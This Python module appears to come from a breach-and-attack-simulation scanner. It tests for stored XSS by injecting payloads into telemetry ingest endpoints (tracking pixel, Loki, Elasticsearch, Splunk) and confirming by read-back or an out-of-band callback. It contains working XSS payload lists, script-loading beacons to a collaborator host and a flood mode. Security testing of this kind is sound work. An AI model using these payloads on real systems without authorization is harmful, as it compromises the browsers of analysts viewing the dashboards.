"""Stored-XSS-via-telemetry-injection target (multi-surface + OOB).

Many analytics pipelines accept unauthenticated telemetry, persist the raw field
values, and later render them in an operator dashboard. If that dashboard renders
the value unsanitized (e.g. React ``dangerouslySetInnerHTML``), an attacker-
controlled telemetry field becomes stored XSS that fires in an analyst's browser.
Real-world example: Baidu Tongji ``hm.gif?url="><script>...`` surfacing in the
"Pages" report.

Stored XSS is a TWO-STAGE finding, so this module does both stages itself and
across several ingest surfaces (tracking pixel, Loki, Elasticsearch, Splunk, and
a "blind" sink):

  1. INJECT an XSS payload through the surface's telemetry API. If the ingest is
     not accepted (non-2xx), stop -- nothing was stored.
  2. Confirm, two ways:
       * REFLECTION -- read back the surface's dashboard/report URL and check
         whether the payload is present *unsanitized* (raw ``<script>``).
       * OUT-OF-BAND -- for blind sinks (stored + executed but never reflected),
         inject a payload that beacons to a collaborator, then poll the
         collaborator for the correlation token.
     Either confirmation => stored XSS (EXPOSED). An HTML-encoded reflection with
     no callback => stored-but-sanitized (safe).

This encodes the requested escalation: telemetry that a surface accepts (2xx) is
escalated to a stored-XSS check via that same channel, over every configured
surface, with an OOB fallback for the non-reflectable cases.
"""
from __future__ import annotations

import html
import time

import requests

from ..base import TargetModule
from ..core import Prepared, variant_count, debug, now_iso, sample_hex

# Reflection payloads ({n} = unique nonce, so a read-back can't false-positive).
_REFLECT = (
    '"><script>alert("{n}")</script>',
    '<img src=x onerror=alert("{n}")>',
    '<svg/onload=alert("{n}")>',
    '"><svg><script>alert("{n}")</script>',
    '<iframe src="javascript:alert(\'{n}\')"></iframe>',
    '<body onload=alert("{n}")>',
    '\'"><script>/*{n}*/alert(document.domain)</script>',
)
# OOB payloads: a browser rendering them fetches a subresource from the
# collaborator ({oob}/{n}), confirming execution even with no page reflection.
_OOB = (
    '"><img src="{oob}/{n}.png">',
    '"><script src="{oob}/{n}.js"></script>',
)


class StoredXssModule(TargetModule):
    name = "stored_xss"
    description = "stored XSS via telemetry injection (multi-surface + OOB)"
    supported_techniques = ("basic", "bulk")

    def default_config(self, base_url: str) -> dict:
        return {
            "enabled": True,
            "description": self.description,
            "_note": ("Stored-XSS probe. The primary surface is a tracking pixel "
                      "('endpoint' ingests, 'verify_url' renders). 'surfaces' adds "
                      "more ingest->dashboard chains (loki/es/splunk/blind). "
                      "'oob_base' is the collaborator payloads beacon to and "
                      "'oob_poll' is where confirmation is polled -- these confirm "
                      "BLIND stored XSS that never reflects."),
            "endpoint": f"{base_url}/tongji/hm.gif",
            "inject_param": "url",
            "verify_url": f"{base_url}/tongji/pages",
            "extra_params": {},
            "oob_base": f"{base_url}/oob",
            "oob_poll": f"{base_url}/oob/poll",
            "surfaces": [
                {"name": "loki", "kind": "loki_push",
                 "endpoint": f"{base_url}/vuln/loki/push",
                 "verify_url": f"{base_url}/vuln/grafana/explore"},
                {"name": "elasticsearch", "kind": "es_doc",
                 "endpoint": f"{base_url}/vuln/es/_doc",
                 "verify_url": f"{base_url}/vuln/kibana/discover"},
                {"name": "splunk", "kind": "splunk_event",
                 "endpoint": f"{base_url}/vuln/splunk/event",
                 "verify_url": f"{base_url}/vuln/splunk/search"},
                {"name": "blind", "kind": "message", "oob_only": True,
                 "endpoint": f"{base_url}/vuln/blind/collect",
                 "verify_url": f"{base_url}/vuln/blind/render"},
            ],
        }

    # -- surface handling ---------------------------------------------------- #
    def _surfaces(self, mcfg) -> list:
        primary = {"name": "pixel", "kind": "pixel_param",
                   "endpoint": mcfg["endpoint"],
                   "inject_param": mcfg.get("inject_param", "url"),
                   "extra_params": mcfg.get("extra_params", {}),
                   "verify_url": mcfg.get("verify_url", "")}
        return [primary] + list(mcfg.get("surfaces", []))

    def _request(self, surface, payload):
        """Build (method, url, kwargs) placing the payload in the surface's
        natural telemetry shape."""
        kind = surface.get("kind", "pixel_param")
        ep = surface["endpoint"]
        jhdr = {"Content-Type": "application/json"}
        if kind == "pixel_param":
            params = dict(surface.get("extra_params") or {})
            params[surface.get("inject_param", "url")] = payload
            return "GET", ep, {"params": params}
        if kind == "loki_push":
            body = {"streams": [{"stream": {"job": "hyperject-bas"},
                                 "values": [[str(time.time_ns()), payload]]}]}
            return "POST", ep, {"json": body, "headers": jhdr}
        if kind == "es_doc":
            body = {"@timestamp": now_iso(short=True), "message": payload,
                    "source": "hyperject-bas"}
            return "POST", ep, {"json": body, "headers": jhdr}
        if kind == "splunk_event":
            body = {"event": payload, "sourcetype": "hyperject:bas"}
            return "POST", ep, {"json": body, "headers": jhdr}
        return "POST", ep, {"json": {"message": payload}, "headers": jhdr}

    def _payload_templates(self, surface) -> list:
        if surface.get("oob_only"):
            return list(_OOB)
        return list(_REFLECT) + list(_OOB)

    def _check(self, payload, nonce, surface, mcfg, timeout):
        verify_url = surface.get("verify_url", "")
        oob_poll = mcfg.get("oob_poll", "")
        sname = surface.get("name", "?")
        encoded = html.escape(payload)

        def check(r) -> bool:
            if not (200 <= r.status_code < 300):
                debug(f"stored_xss[{sname}]: ingest rejected ({r.status_code})")
                return False
            # Render the dashboard: gives us the reflection body AND, on the
            # emulator, fires the OOB beacon for stored payloads.
            body = ""
            if verify_url:
                try:
                    body = requests.get(verify_url, timeout=timeout).text or ""
                except Exception as e:
                    debug(f"stored_xss[{sname}]: render fetch failed: {e}")
            if payload in body:
                debug(f"stored_xss[{sname}]: CONFIRMED via reflection")
                return True
            # Out-of-band: did the rendered payload call the collaborator back?
            if oob_poll and nonce:
                try:
                    hit = requests.get(f"{oob_poll}/{nonce}", timeout=timeout).json()
                    if hit.get("seen"):
                        debug(f"stored_xss[{sname}]: CONFIRMED via OOB callback")
                        return True
                except Exception:
                    pass
            debug(f"stored_xss[{sname}]: "
                  + ("stored but sanitized — safe" if encoded in body
                     else "accepted but no reflection/callback"))
            return False

        return check

    def _prep(self, surface, mcfg, template, timeout) -> Prepared:
        nonce = f"HJX{sample_hex(6)}"
        payload = template.format(n=nonce, oob=mcfg.get("oob_base", ""))
        method, url, kwargs = self._request(surface, payload)
        return Prepared(method, url, kwargs,
                        self._check(payload, nonce, surface, mcfg, timeout))

    def plan(self, mcfg, cfg, variants):
        timeout = cfg.get("run", {}).get("timeout", 10)
        out = []
        for v in variants:
            for surface in self._surfaces(mcfg):
                label = f"{surface['endpoint']} [{surface['name']}]"
                templates = self._payload_templates(surface)
                if v == "bulk":
                    preps = [self._prep(surface, mcfg, templates[0], timeout)
                             for _ in range(variant_count(v, cfg))]
                    out.append((v, f"{label} [flood]", preps))
                else:
                    preps = [self._prep(surface, mcfg, t, timeout)
                             for t in templates]
                    out.append((v, label, preps))
        return out
